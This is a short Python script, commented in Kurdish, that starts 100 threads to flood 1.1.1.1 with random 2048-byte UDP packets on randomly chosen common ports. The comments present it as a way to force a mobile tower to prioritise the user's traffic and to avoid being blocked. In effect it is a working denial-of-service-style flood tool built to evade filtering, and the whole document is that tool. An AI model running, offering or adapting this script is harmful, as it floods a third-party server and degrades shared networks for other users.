import socket
import threading
import random
import time

# لیستێک لە پۆرتە گرنگەکان بۆ ئەوەی بورجەکە وا بزانێت داتای جیاوازە
ports = [80, 443, 8080, 53, 123, 445]
target_ip = "1.1.1.1" # سێرڤەری کڵاودفڵێر بۆ خێرایی وەڵامدانەوە

def extreme_stress():
    while True:
        try:
            # دروستکردنی پەیوەندی خێرا
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            port = random.choice(ports)
            # ناردنی داتای هەڕەمەکی بۆ ئەوەی بورجەکە نەتوانێت بلۆکی بکات
            msg = random._urandom(2048) 
            s.sendto(msg, (target_ip, port))
        except:
            pass

print("--- EXTREME PRIORITY MODE: ACTIVE ---")
print("Warning: High Data Usage & Battery Drain")

# زیادکردنی ژمارەی هێزەکان بۆ 100 بۆ ئەوەی بورجەکە ناچار بکەیت
for i in range(100):
    t = threading.Thread(target=extreme_stress)
    t.daemon = True
    t.start()

while True:
    time.sleep(1)

